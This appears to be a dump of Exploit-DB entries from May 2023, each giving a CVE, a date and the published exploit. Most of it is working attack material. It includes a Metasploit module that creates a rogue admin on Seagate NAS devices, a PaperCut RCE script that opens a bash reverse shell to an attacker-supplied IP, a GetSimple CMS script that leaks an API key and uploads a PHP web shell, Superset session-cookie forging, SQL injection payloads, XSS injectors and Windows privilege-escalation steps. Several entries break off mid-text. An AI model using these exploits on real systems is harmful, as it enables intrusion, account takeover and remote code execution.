CVE-2023-31747,2023-05-25,exploit db,"# Exploit Title: Filmora 12 version ( Build 1.0.0.7) - Unquoted Service Paths Privilege Escalation # Date: 20 May 2023 # Exploit Author: Thurein Soe # Vendor Homepage: https://filmora.wondershare.com # Software Link: https://mega.nz/file/tQNGGZTQ#E1u20rdbT4R3pgSoUBG93IPAXqesJ5yyn6T8RlMFxaE # Version: Filmora 12 ( Build 1.0.0.7) # Tested on: Windows 10 (Version 10.0.19045.2965) # CVE : CVE-2023-31747 Vulnerability description: Filmora is a professional video editing software. Wondershare NativePush Build 1.0.0.7 was part of Filmora 12 (Build 12.2.1.2088). Wondershare NativePush Build 1.0.0.7 was installed while Filmora 12 was installed. The service name ""NativePushService"" was vulnerable to unquoted service paths vulnerability which led to full local privilege escalation in the affected window operating system as the service ""NativePushService"" was running with system privilege that the local user has write access to the directory where the service is located. Effectively, the local user is able to elevate to local admin upon successfully replacing the affected executable. C:\sc qc NativePushService [SC] QueryServiceConfig SUCCESS SERVICE_NAME: NativePushService TYPE : 10 WIN32_OWN_PROCESS START_TYPE : 2 AUTO_START ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : C:\Users\HninKayThayar\AppData\Local\Wondershare\Wondershare NativePush\WsNativePushService.exe LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : Wondershare Native Push Service DEPENDENCIES : SERVICE_START_NAME : LocalSystem C:\cacls ""C:\Users\HninKayThayar\AppData\Local\Wondershare\Wondershare NativePush\WsNativePushService.exe"" C:\Users\HninKayThayar\AppData\Local\Wondershare\Wondershare NativePush\WsNativePushService.exe BUILTIN\Users:(ID)F NT AUTHORITY\SYSTEM:(ID)F BUILTIN\Administrators:(ID)F HNINKAYTHAYAR\HninKayThayar:(ID)F"
CVE-2020-6627,2023-05-25,exploit db,"# Exploit Title: Seagate Central Storage 2015.0916 - Unauthenticated Remote Command Execution (Metasploit) # Date: Dec 9 2019 # Exploit Author: Ege Balci # Vendor Homepage: https://www.seagate.com/de/de/support/external-hard-drives/network-storage/seagate-central/ # Version: 2015.0916 # CVE : 2020-6627 # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework require 'net/http' require 'net/ssh' require 'net/ssh/command_stream' class MetasploitModule < Msf::Exploit::Remote Rank = ExcellentRanking include Msf::Exploit::Remote::HttpClient include Msf::Exploit::Remote::SSH def initialize(info={}) super(update_info(info, 'Name' => ""Seagate Central External NAS Arbitrary User Creation"", 'Description' => %q{ This module exploits the broken access control vulnerability in Seagate Central External NAS Storage device. Subject product suffers several critical vulnerabilities such as broken access control. It makes it possible to change the device state and register a new admin user which is capable of SSH access. 'License' => MSF_LICENSE, 'Author' => 'Ege Balcı ' # author & msf module 'References' => ['URL', 'https://pentest.blog/advisory-seagate-central-storage-remote-code-execution/'], ['CVE', '2020-6627'] 'DefaultOptions' => 'SSL' => false, 'WfsDelay' => 5, 'Platform' => ['unix'], 'Arch' => [ARCH_CMD], 'Payload' => 'Compat' => { 'PayloadType' => 'cmd_interact', 'ConnectionType' => 'find' 'Targets' => ['Auto', 'Platform' => 'unix', 'Arch' => ARCH_CMD 'Privileged' => true, 'DisclosureDate' => ""Dec 9 2019"", 'DefaultTarget' => 0 register_options( OptString.new('USER', [ true, 'Seagate Central SSH user', '']), OptString.new('PASS', [ true, 'Seagate Central SSH user password', '']) ], self.class register_advanced_options( OptBool.new('SSH_DEBUG', [ false, 'Enable SSH debugging output (Extreme verbosity!)', false]), OptInt.new('SSH_TIMEOUT', [ false, 'Specify the maximum time to negotiate a SSH session', 30]) end def check res = send_request_cgi({ 'method' => 'GET', 'uri' => normalize_uri(target_uri.path,""/index.php/Start/get_firmware""), 'headers' => { 'X-Requested-With' => 'XMLHttpRequest' },60) if res && res.body.include?('Cirrus NAS') && res.body.include?('2015.0916') Exploit::CheckCode::Appears else Exploit::CheckCode::Safe end end def exploit # First get current state first_state=get_state() if first_state print_status(""Current device state: #{first_state['state']}"") else return end if first_state['state'] != 'start' # Set new start state first_state['state'] = 'start' res = send_request_cgi({ 'method' => 'POST', 'uri' => normalize_uri(target_uri.path,'/index.php/Start/set_start_info'), 'ctype' => 'application/x-www-form-urlencoded', 'data' => ""info=#{first_state.to_json}"" },60) changed_state=get_state() if changed_state && changed_state['state'] == 'start' print_good(""State successfully changed !"") else print_error(""Could not change device state"") return end end name = Rex::Text.rand_name_male user = datastore['USER'] || ""#{Rex::Text.rand_name_male}{rand(1..9999).to_s}"" pass = datastore['PASS'] || Rex::Text.rand_text_alpha(8) print_status('Creating new admin user...') print_status(""User: #{user}"") print_status(""Pass: #{pass}"") # Add new admin user res = send_request_cgi({ 'method' => 'POST', 'uri' => normalize_uri(target_uri.path,""/index.php/Start/add_edit_user""), 'ctype' => 'application/x-www-form-urlencoded', 'headers' => { 'X-Requested-With' => 'XMLHttpRequest' 'vars_post' => {user: JSON.dump({user: user, fullname: name, pwd: pass, email: ""#{name}@localhost"", isAdmin: true, uid: -1}), action: 1} },60) conn = do_login(user,pass) if conn print_good(""#{rhost}:#{rport} - Login Successful (#{user}:#{pass})"") handler(conn.lsock) end end def do_login(user, pass) factory = ssh_socket_factory opts = { :auth_methods => ['password', 'keyboard-interactive'], :port => 22, :use_agent => false, :config => false, :password => pass, :proxy => factory, :non_interactive => true, :verify_host_key => :never opts.merge!(:verbose => :debug) if datastore['SSH_DEBUG'] begin ssh = nil ::Timeout.timeout(datastore['SSH_TIMEOUT']) do ssh = Net::SSH.start(rhost, user, opts) end rescue Rex::ConnectionError fail_with Failure::Unreachable, 'Connection failed' rescue Net::SSH::Disconnect, ::EOFError print_error ""#{rhost}:#{rport} SSH - Disconnected during negotiation"" return rescue ::Timeout::Error print_error ""#{rhost}:#{rport} SSH - Timed out during negotiation"" return rescue Net::SSH::AuthenticationFailed print_error ""#{rhost}:#{rport} SSH - Failed authentication"" rescue Net::SSH::Exception => e print_error ""#{rhost}:#{rport} SSH Error: #{e.class} : #{e.message}"" return end if ssh conn = Net::SSH::CommandStream.new(ssh) ssh = nil return conn end return nil end def get_state res = send_request_cgi({ 'method' => 'GET', 'uri' => normalize_uri(target_uri.path,""/index.php/Start/json_get_start_info""), 'headers' => { 'X-Requested-With' => 'XMLHttpRequest' },60) if res && (res.code == 200 ||res.code == 100) return res.get_json_document end res = nil end end"
CVE-2023-33829,2023-05-25,exploit db,"#!/usr/bin/python3 # Exploit Title: SCM Manager 1.60 - Cross-Site Scripting Stored (Authenticated) # Google Dork: intitle:""SCM Manager"" intext:1.60 # Date: 05-25-2023 # Exploit Author: neg0x (https://github.com/n3gox/CVE-2023-33829) # Vendor Homepage: https://scm-manager.org/ # Software Link: https://scm-manager.org/docs/1.x/en/getting-started/ # Version: 1.2 <= 1.60 # Tested on: Debian based # CVE: CVE-2023-33829 # Modules import requests import argparse import sys # Main menu parser = argparse.ArgumentParser(description='CVE-2023-33829 exploit') parser.add_argument(""-u"", ""--user"", help=""Admin user or user with write permissions"") parser.add_argument(""-p"", ""--password"", help=""password of the user"") args = parser.parse_args() # Credentials user = sys.argv[2] password = sys.argv[4] # Global Variables main_url = ""http://localhost:8080/scm"" # Change URL if its necessary auth_url = main_url + ""/api/rest/authentication/login.json"" users = main_url + ""/api/rest/users.json"" groups = main_url + ""/api/rest/groups.json"" repos = main_url + ""/api/rest/repositories.json"" # Create a session session = requests.Session() # Credentials to send post_data={ 'username': user, # change if you have any other user with write permissions 'password': password # change if you have any other user with write permissions r = session.post(auth_url, data=post_data) if r.status_code == 200: print(""[+] Authentication successfully"") else: print(""[-] Failed to authenticate"") sys.exit(1) new_user={ ""name"": ""newUser"", ""displayName"": "" "", ""mail"": """", ""password"": """", ""admin"": False, ""active"": True, ""type"": ""xml"" create_user = session.post(users, json=new_user) print(""[+] User with XSS Payload created"") new_group={ ""name"": ""newGroup"", ""description"": "" "", ""type"": ""xml"" create_group = session.post(groups, json=new_group) print(""[+] Group with XSS Payload created"") new_repo={ ""name"": ""newRepo"", ""type"": ""svn"", ""contact"": """", ""description"": "" "", ""public"": False create_repo = session.post(repos, json=new_repo) print(""[+] Repository with XSS Payload created"")"
CVE-2023-34581,2023-05-24,exploit db,"# Exploit Title: Service Provider Management System v1.0 - SQL Injection # Date: 2023-05-23 # Exploit Author: Ashik Kunjumon # Vendor Homepage: https://www.sourcecodester.com/users/lewa # Software Link: https://www.sourcecodester.com/php/16501/service-provider-management-system-using-php-and-mysql-source-code-free-download.html # Version: 1.0 # Tested on: Windows/Linux 1. Description: Service Provider Management System v1.0 allows SQL Injection via ID parameter in /php-spms/?page=services/view&id=2 Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database. Endpoint: /php-spms/?page=services/view&id=2 Vulnerable parameter: id (GET) 2. Proof of Concept: Step 1 - By visiting the url: http://localhost/php-spms/?page=services/view&id=2 just add single quote to verify the SQL Injection. Step 2 - Run sqlmap -u "" http://localhost/php-spms/?page=services/view&id=2"" -p id --dbms=mysql SQLMap Response: Parameter: id (GET) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: page=services/view&id=1' AND 8462=8462 AND 'jgHw'='jgHw Type: error-based Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR) Payload: page=services/view&id=1' AND (SELECT 1839 FROM(SELECT COUNT(*),CONCAT(0x7178717171,(SELECT (ELT(1839=1839,1))),0x7176786271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'Cqhk'='Cqhk Type: time-based blind Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP) Payload: page=services/view&id=1' AND (SELECT 1072 FROM (SELECT(SLEEP(5)))lurz) AND 'RQzT'='RQzT"
CVE-2023-31873,2023-05-23,exploit db,# Exploit Title: Gin Markdown Editor v0.7.4 (Electron) - Arbitrary Code Execution # Date: 2023-04-24 # Exploit Author: 8bitsec # CVE: CVE-2023-31873 # Vendor Homepage: https://github.com/mariuskueng/gin # Software Link: https://github.com/mariuskueng/gin # Version: 0.7.4 # Tested on: [Mac OS 13] Release Date: 2023-04-24 Product & Service Introduction: Javascript Markdown editor for Mac Technical Details & Description: A vulnerability was discovered on Gin markdown editor v0.7.4 allowing a user to execute arbitrary code by opening a specially crafted file. Proof of Concept (
CVE-2023-31874,2023-05-23,exploit db,"# Exploit Title: Yank Note v3.52.1 (Electron) - Arbitrary Code Execution # Date: 2023-04-27 # Exploit Author: 8bitsec # CVE: CVE-2023-31874 # Vendor Homepage: yank-note.com # Software Link: https://github.com/purocean/yn # Version: 3.52.1 # Tested on: [Ubuntu 22.04 | Mac OS 13] Release Date: 2023-04-27 Product & Service Introduction: A Hackable Markdown Editor for Programmers. Version control, AI completion, mind map, documents encryption, code snippet running, integrated terminal, chart embedding, HTML applets, Reveal.js, plug-in, and macro replacement Technical Details & Description: A vulnerability was discovered on Yank Note v3.52.1 allowing a user to execute arbitrary code by opening a specially crafted file. Proof of Concept ("
CVE-2023-31748,2023-05-23,exploit db,"# Exploit Title :MobileTrans 4.0.11 - Weak Service Privilege Escalation # Date: 20 May 2023 # Exploit Author: Thurein Soe # Vendor Homepage: https://mobiletrans.wondershare.com/ # Software Link: https://mega.nz/file/0Et0ybRS#l69LRlvwrwmqDfPGKl_HaJ5LmbeKJu_wH0xYKD8nSVg # Version: MobileTrans version 4.0.11 # Tested on: Window 10 (Version 10.0.19045.2965) # CVE : CVE-2023-31748 Vulnerability Description: MobileTrans is World 1 mobile-to-mobile file transfer application.MobileTrans version 4.0.11 was being suffered a weak service permission vulnerability that allows a normal window user to elevate to local admin. The ""ElevationService"" service name was installed, while the MobileTrans version 4.0.11 was installed in the window operating system. The service ""ElevationService"" allows the local user to elevate to the local admin as The ""ElevationService"" run with system privileges. Effectively, the local user is able to elevate to local admin upon successfully modifying the service or replacing the affected executable. C:\Users\HninKayThayar\Desktop>sc qc ElevationService [SC] QueryServiceConfig SUCCESS SERVICE_NAME: ElevationService TYPE : 10 WIN32_OWN_PROCESS START_TYPE : 2 AUTO_START ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : C:\Program Files (x86)\Wondershare\MobileTrans\ElevationService.exe LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : Wondershare Driver Install Service help DEPENDENCIES : SERVICE_START_NAME : LocalSystem C:\Users\HninKayThayar\Desktop>cacls ""C:\Program Files (x86)\Wondershare\MobileTrans\ElevationService.exe"" C:\Program Files (x86)\Wondershare\MobileTrans\ElevationService.exe Everyone:(ID)F NT AUTHORITY\SYSTEM:(ID)F BUILTIN\Administrators:(ID)F BUILTIN\Users:(ID)R APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(ID)R APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(ID)R"
CVE-2023-27823,2023-05-23,exploit db,"# Exploit Title: Optoma 1080PSTX Firmware C02 - Authentication Bypass # Date: 2023/05/09 # Exploit Author: Anthony Cole # Contact: http://twitter.com/acole76 # Website: http://twitter.com/acole76 # Vendor Homepage: http://optoma.com # Version: Optoma 1080PSTX Firmware C02 # Tested on: N/A # CVE : CVE-2023-27823 Details By default the web interface of the 1080PSTX requires a username and password to access the application control panel. However, an attacker, on the same network, can bypass it by manually setting the ""atop"" cookie to the value of ""1"". GET /index.asp HTTP/1.1 Host: projector Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.111 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Cookie: atop=1 Connection: close"
CVE-2023-27524,2023-05-23,exploit db,"# Exploit Title: Apache Superset 2.0.0 - Authentication Bypass # Date: 10 May 2023 # Exploit Author: MaanVader # Vendor Homepage: https://superset.apache.org/ # Version: Apache Superset<= 2.0.1 # Tested on: 2.0.0 # CVE: CVE-2023-27524 from flask_unsign import session import requests import urllib3 import argparse import re from time import sleep from selenium import webdriver from urllib.parse import urlparse urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) SECRET_KEYS = [ b'\x02\x01thisismyscretkey\x01\x02\\e\\y\\y\\h', # version < 1.4.1 b'CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET', # version >= 1.4.1 b'thisISaSECRET_1234', # deployment template b'YOUR_OWN_RANDOM_GENERATED_SECRET_KEY', # documentation b'TEST_NON_DEV_SECRET' # docker compose def main(): parser = argparse.ArgumentParser() parser.add_argument('--url', '-u', help='Base URL of Superset instance', required=True) parser.add_argument('--id', help='User ID to forge session cookie for, default=1', required=False, default='1') args = parser.parse_args() try: u = args.url.rstrip('/') + '/login/' headers = { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:101.0) Gecko/20100101 Firefox/101.0' resp = requests.get(u, headers=headers, verify=False, timeout=30, allow_redirects=False) if resp.status_code != 200: print(f'Error retrieving login page at {u}, status code: {resp.status_code}') return session_cookie = None for c in resp.cookies: if c.name == 'session': session_cookie = c.value break if not session_cookie: print('Error: No session cookie found') return print(f'Got session cookie: {session_cookie}') try: decoded = session.decode(session_cookie) print(f'Decoded session cookie: {decoded}') except: print('Error: Not a Flask session cookie') return match = re.search(r'""version_string"": ""(.*?)""', resp.text) if match: version = match.group(1) else: version = 'Unknown' print(f'Superset Version: {version}') for i, k in enumerate(SECRET_KEYS): cracked = session.verify(session_cookie, k) if cracked: break if not cracked: print('Failed to crack session cookie') return print(f'Vulnerable to CVE-2023-27524 - Using default SECRET_KEY: {k}') try: user_id = int(args.id) except: user_id = args.id forged_cookie = session.sign({'_user_id': user_id, 'user_id': user_id}, k) print(f'Forged session cookie for user {user_id}: {forged_cookie}') u1 = args.url.rstrip('/') + '/superset/welcome' print(f""Now visit the url: `{u1}` and replace the current session cookie with this `{forged_cookie}` and refresh the page and we will be logged in as admin to the dashboard:)"") except Exception as e: print(f'Unexpected error: {e}') if __name__ == '__main__': main()"
CVE-2023-1934,2023-05-23,exploit db,"# Exploit Title: PnPSCADA v2.x - Unauthenticated PostgreSQL Injection # Date: 15/5/2023 # Exploit Author: Momen Eldawakhly (Cyber Guy) at Samurai Digital Security Ltd # Vendor Homepage: https://pnpscada.com/ # Version: PnPSCADA (cross platforms): v2.x # Tested on: Unix # CVE : CVE-2023-1934 # Proof-of-Concept: https://drive.google.com/drive/u/0/folders/1r_HMoaU3P0t-04gMM90M0hfdBRi_P0_8 SQLi crashing point: GET /hitlogcsv.isp?userids=1337'&startdate= 2022-12-138200083A0093A00&enddate=2022-12-138201383A1783A00 HTTP/1.1 Cache-Control: no-cache User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14 Host: vulnerablepnpscada.int Accept: */* Accept-Encoding: gzip, deflate Connection: close"
CVE-2023-27350,2023-05-23,exploit db,"# Exploit Title: PaperCut NG/MG 22.0.4 - Remote Code Execution (RCE) # Date: 13 May 2023 # Exploit Author: Mohin Paramasivam (Shad0wQu35t) and MaanVader # Vendor Homepage: https://www.papercut.com/ # Version: 8.0 or later # Tested on: 22.0.4 # CVE: CVE-2023-27350 import requests import argparse Group_payload = { ""service"":""direct/1/OptionsUserSync/$OptionsUserSource.$Form"", ""sp"":""S0"", ""Form0"":""$Hidden,$Hidden$0,$Hidden$1,$PropertySelection,$Hidden$2,$Hidden$3,$Hidden$4,$Hidden$5,$Hidden$6,$Hidden$7,$Hidden$8,$Hidden$9,$Hidden$10,$Hidden$11,$Hidden$12,$Hidden$13,$Hidden$14,$TextField,$TextField$0,$RadioGroup,$Submit,$Checkbox$2,primaryCardIdLength,$Checkbox$3,secondaryCardIdLength,$Checkbox$5,$Hidden$15,$Hidden$16,$Hidden$17,$Hidden$18,$Hidden$19,$Hidden$20,$Hidden$21,$PropertySelection$4,$TextField$13,$Checkbox$6,$TextField$14,$TextField$15,$TextField$16,$RadioGroup$0,$Submit$1,$PropertySelection$5,$TextField$17,$PropertySelection$6,$TextField$18,primaryCardId2Length,$PropertySelection$7,$TextField$19,secondaryCardId2Length,$Checkbox$7,$TextField$20,$Checkbox$8,$Checkbox$9,$Checkbox$10,$Submit$2,$Submit$3,$Submit$4,$Submit$5"", ""$Hidden"":""Sf278fd737ffcaed6eb3d1f67c2ba5c6d"", ""$Hidden$0"":""F"", ""$Hidden$1"":""F"", ""$Hidden$2"":""OH4sIAAAAAAAAAJWQwUrDQBCGp60VBBUp4lWRnncRPIjSg4iHwrYNpBU8xXW7JitJdp1sis2hF5_BlxBP-lw-gF50Y2Mp6MW5DTP_fP8_z2_QzBDotSqI4UaiyC0xIg1JJnGihCQDY5VOs5HrfZ2jkMOpkVeHny8bD8VeHVa6sBYYVBqVnTLYCnhuIw91iDzxuI0stNgtn3Aa8zSkvkWVhies1MTc3mhMLBwzR6c_dFrSaUWnf9LbXqV1h3aCfDFbwt7BDGr3CO3fwXKrYsK04LEq5Pg8zZPex26j87i-XQdwkn2NIeGGi0gSoZPE4Ulpnki3mpFS8N556r4eXBR1qDFoqj5P5BxoLKyejfzhoAcAYzNDOPrnZxfZoKrWt6nN8odzG6WB5aFjNk77l-YLeZfbs8sBAAA."", ""$Hidden$3"":""F"", ""$Hidden$4"":""X"", ""$Hidden$5"":""X"", ""$Hidden$6"":""X"", ""$Hidden$7"":""X"", ""$Hidden$8"":""X"", ""$Hidden$9"":""X"", ""$Hidden$10"":""X"", ""$Hidden$11"":""X"", ""$Hidden$12"":""X"", ""$Hidden$13"":""F"", ""$Hidden$14"":""X"", ""$Hidden$15"":""F"", ""$Hidden$16"":""S"", ""$Hidden$17"":""S"", ""$Hidden$18"":""S"", ""$Hidden$19"":""S"", ""$Hidden$20"":""F"", ""$Hidden$21"":""SSTANDARD_UNIX"", ""$PropertySelection"":""3,CUSTOM"", ""$TextField"":""/usr/bin/python3"", ""$TextField$0"":""/usr/bin/python3"", ""$RadioGroup"":""0"", ""primaryCardIdLength"":""8"", ""secondaryCardIdLength"":""8"", ""$PropertySelection$4"":""0,STANDARD_UNIX"", ""$TextField$13"":"""", ""$TextField$14"":"""", ""$TextField$15"":"""", ""$TextField$16"":"""", ""$RadioGroup$0"":""0"", ""$PropertySelection$5"":""NONE"", ""$TextField$17"":"""", ""$PropertySelection$6"":""NONE"", ""$TextField$18"":""employeeNumber"", ""primaryCardId2Length"":""8"", ""$PropertySelection$7"":""NONE"", ""$TextField$19"":"""", ""secondaryCardId2Length"":""8"", ""$TextField$20"":"""", ""$Submit$4"":""Apply"" parser = argparse.ArgumentParser(description=""Papercut RCE"") parser.add_argument('--url',help='Url of the vunerable application example http://10.2.3.4:9191 dont need the trailing /') parser.add_argument('--ip',help='our rev shell ip') parser.add_argument('--port',help='our rev shell port') args = parser.parse_args() url = args.url ip = args.ip port = args.port passwd_input = f""import os;os.system(\""/bin/bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'\"")"" final_payload = { ""service"":""direct/1/Home/$Form$0"", ""sp"":""S0"", ""Form0"":""$Hidden$0,$Hidden$1,inputUsername,inputPassword,$PropertySelection$0,$Submit$0"", ""$Hidden$0"":""true"", ""$Hidden$1"":""X"", ""inputUsername"":""help"", ""inputPassword"":passwd_input, ""$PropertySelection$0"":""en"", ""$Submit$0"":""Log+in"" # create a session session = requests.Session() # visit the first URL to set up the session setup_url = url+""/app?service=page/SetupCompleted"" response = session.get(setup_url) response.raise_for_status() # check for any errors # visit the second URL using the same session dashboard_url = url+""/app?service=page/Dashboard"" response = session.get(dashboard_url) response.raise_for_status() # check for any errors # URL to change user group user_group_change_url = url+""/app"" response = session.post(user_group_change_url,data=Group_payload) response.raise_for_status() # check for errors # URL to gain RCE rce_url = url+""/app"" response = session.post(rce_url,data=final_payload) response.raise_for_status() # Check for any errors # print the response text print(response.text)"
CVE-2023-30256,2023-05-23,exploit db,"# Exploit Title: Webkul Qloapps 1.5.2 - Cross-Site Scripting (XSS) # Date: 15 May 2023 # Exploit Author: Astik Rawat (ahrixia) # Vendor Homepage: https://qloapps.com/ # Software Link: https://github.com/webkul/hotelcommerce # Version: 1.5.2 # Tested on: Kali Linux 2022.4 # CVE : CVE-2023-30256 Description: A Cross Site Scripting (XSS) vulnerability exists in Webkul Qloapps which is a free and open-source hotel reservation & online booking system written in PHP and distributed under OSL-3.0 Licence. Steps to exploit: 1) Go to Signin page on the system. 2) There are two parameters which can be exploited via XSS - back - email_create 2.1) Insert your payload in the ""back""- GET and POST Request Proof of concept ("
CVE-2023-31702,2023-05-23,exploit db,# Exploit Title: eScan Management Console 14.0.1400.2281 - SQL Injection (Authenticated) # Date: 16/05/2023 # Exploit Author: Sahil Ojha # Vendor Homepage: https://www.escanav.com # Software Link: https://cl.escanav.com/ewconsole.dll # Version: 14.0.1400.2281 # Tested on: Windows # CVE : CVE-2023-31702 *Step of Reproduction/Proof of concept(
CVE-2023-31703,2023-05-23,exploit db,# Exploit Title: eScan Management Console 14.0.1400.2281 - Cross Site Scripting # Date: 2023-05-16 # Exploit Author: Sahil Ojha # Vendor Homepage: https://www.escanav.com # Software Link: https://cl.escanav.com/ewconsole.dll # Version: 14.0.1400.2281 # Tested on: Windows # CVE : CVE-2023-31703 *Step of Reproduction/ Proof of Concept(
CVE-2022-41544,2023-05-23,exploit db,"# Exploit Title: GetSimple CMS v3.3.16 - Remote Code Execution (RCE) # Data: 18/5/2023 # Exploit Author : Youssef Muhammad # Vendor: Get-simple # Software Link: # Version app: 3.3.16 # Tested on: linux # CVE: CVE-2022-41544 import sys import hashlib import re import requests from xml.etree import ElementTree from threading import Thread import telnetlib purple = ""\033[0;35m"" reset = ""\033[0m"" yellow = ""\033[93m"" blue = ""\033[34m"" red = ""\033[0;31m"" def print_the_banner(): print(purple + ''' CCC V V EEEE 22 000 22 22 4 4 11 5555 4 4 4 4 C V V E 2 2 0 00 2 2 2 2 4 4 111 5 4 4 4 4 C V V EEE --- 2 0 0 0 2 2 --- 4444 11 555 4444 4444 C V V E 2 00 0 2 2 4 11 5 4 4 CCC V EEEE 2222 000 2222 2222 4 11l1 555 4 4 '''+ reset) def get_version(target, path): r = requests.get(f""http://{target}{path}admin/index.php"") match = re.search(""jquery.getsimple.js\?v=(.*)\"""", r.text) if match: version = match.group(1) if version <= ""3.3.16"": print( red + f""[+] the version {version} is vulnrable to CVE-2022-41544"") else: print (""This is not vulnrable to this CVE"") return version return None def api_leak(target, path): r = requests.get(f""http://{target}{path}data/other/authorization.xml"") if r.ok: tree = ElementTree.fromstring(r.content) apikey = tree[0].text print(f""[+] apikey obtained {apikey}"") return apikey return None def set_cookies(username, version, apikey): cookie_name = hashlib.sha1(f""getsimple_cookie_{version.replace('.', '')}{apikey}"".encode()).hexdigest() cookie_value = hashlib.sha1(f""{username}{apikey}"".encode()).hexdigest() cookies = f""GS_ADMIN_USERNAME={username};{cookie_name}={cookie_value}"" headers = { 'Content-Type':'application/x-www-form-urlencoded', 'Cookie': cookies return headers def get_csrf_token(target, path, headers): r = requests.get(f""http://{target}{path}admin/theme-edit.php"", headers=headers) m = re.search('nonce"" type=""hidden"" value=""(.*)""', r.text) if m: print(""[+] csrf token obtained"") return m.group(1) return None def upload_shell(target, path, headers, nonce, shell_content): upload_url = f""http://{target}{path}admin/theme-edit.php?updated=true"" payload = { 'content': shell_content, 'edited_file': '../shell.php', 'nonce': nonce, 'submitsave': 1 try: response = requests.post(upload_url, headers=headers, data=payload) if response.status_code == 200: print(""[+] Shell uploaded successfully!"") else: print(""(-) Shell upload failed!"") except requests.exceptions.RequestException as e: print(""(-) An error occurred while uploading the shell:"", e) def shell_trigger(target, path): url = f""http://{target}{path}/shell.php"" try: response = requests.get(url) if response.status_code == 200: print(""[+] Webshell trigged successfully!"") else: print(""(-) Failed to visit the page!"") except requests.exceptions.RequestException as e: print(""(-) An error occurred while visiting the page:"", e) def main(): if len(sys.argv) != 5: print(""Usage: python3 CVE-2022-41544.py "") return target = sys.argv[1] path = sys.argv[2] if not path.endswith('/'): path += '/' ip, port = sys.argv[3].split(':') username = sys.argv[4] shell_content = f"""""" $sock, 1 => $sock, 2 => $sock), $pipes); version = get_version(target, path) if not version: print(""(-) could not get version"") return apikey = api_leak(target, path) if not apikey: print(""(-) could not get apikey"") return headers = set_cookies(username, version, apikey) nonce = get_csrf_token(target, path, headers) if not nonce: print(""(-) could not get nonce"") return upload_shell(target, path, headers, nonce, shell_content) shell_trigger(target, path) if __name__ == '__main__': print_the_banner() main()"
CVE-2023-31698,2023-05-23,exploit db,"# Exploit Title: Bludit CMS v3.14.1 - Stored Cross-Site Scripting (XSS) (Authenticated) # Date: 2023-04-15 # Exploit Author: Rahad Chowdhury # Vendor Homepage: https://www.bludit.com/ # Software Link: https://github.com/bludit/bludit/releases/tag/3.14.1 # Version: 3.14.1 # Tested on: Windows 10, PHP 7.4.29, Apache 2.4.53 # CVE: CVE-2023-31698 SVG Payload ------------- save this SVG file xss.svg Steps to Reproduce: 1. At first login your admin panel. 2. then go to settings and click the logo section. 3. Now upload xss.svg file so your request data will be POST /bludit/admin/ajax/logo-upload HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0 Content-Type: multipart/form-data; boundary=---------------------------15560729415644048492005010998 Referer: http://127.0.0.1/bludit/admin/settings Cookie: BLUDITREMEMBERUSERNAME=admin; BLUDITREMEMBERTOKEN=139167a80807781336bc7484552bc985; BLUDIT-KEY=tmap19d0m813e8rqfft8rsl74i Content-Length: 651 -----------------------------15560729415644048492005010998 Content-Disposition: form-data; name=""tokenCSRF"" 626c201693546f472cdfc11bed0938aab8c6e480 -----------------------------15560729415644048492005010998 Content-Disposition: form-data; name=""inputFile""; filename=""xss.svg"" Content-Type: image/svg+xml -----------------------------15560729415644048492005010998-- 4. Now open the logo image link that you upload. You will see XSS pop up."
CVE-2023-31699,2023-05-23,exploit db,"# Exploit Title: ChurchCRM v4.5.4 - Reflected XSS via Image (Authenticated) # Date: 2023-04-17 # Exploit Author: Rahad Chowdhury # Vendor Homepage: http://churchcrm.io/ # Software Link: https://github.com/ChurchCRM/CRM/releases/tag/4.5.4 # Version: 4.5.4 # Tested on: Windows 10, PHP 7.4.29, Apache 2.4.53 # CVE: CVE-2023-31699 Steps to Reproduce: 1. At first login your admin panel. 2. Then click the ""Admin"" menu and click ""CSV Import '' and you will get the CSV file uploader option. 3. now insert xss payload in jpg file using exiftool or from image properties and then upload the jpg file. 4. you will see XSS pop up."
CVE-2023-25440,2023-05-23,exploit db,"# Exploit Title: CiviCRM 5.59.alpha1 - Stored XSS (Cross-Site Scripting) # Date: 2023-02-02 # Exploit Author: Andrea Intilangelo # Vendor Homepage: https://civicrm.org # Software Link: https://civicrm.org/download # Version: 5.59.alpha1, 5.58.0 (and earlier), 5.57.3 (and earlier) # Tested on: Latest Version of Desktop Web Browsers (ATTOW: Firefox 109.0.1, Microsoft Edge 109.0.1518.70) # CVE: CVE-2023-25440 Vendor Security Advisory: CIVI-SA-2023-05 Description: A stored cross-site scripting (XSS) vulnerability in CiviCRM 5.59.alpha1 allows attacker to execute arbitrary web scripts or HTML. Injecting persistent javascript code inside the ""Add Contact"" function while creating a contact, in first/second name field, it will be triggered once page gets loaded. Steps to reproduce: - Quick Add contact to CiviCRM, - Insert a payload"
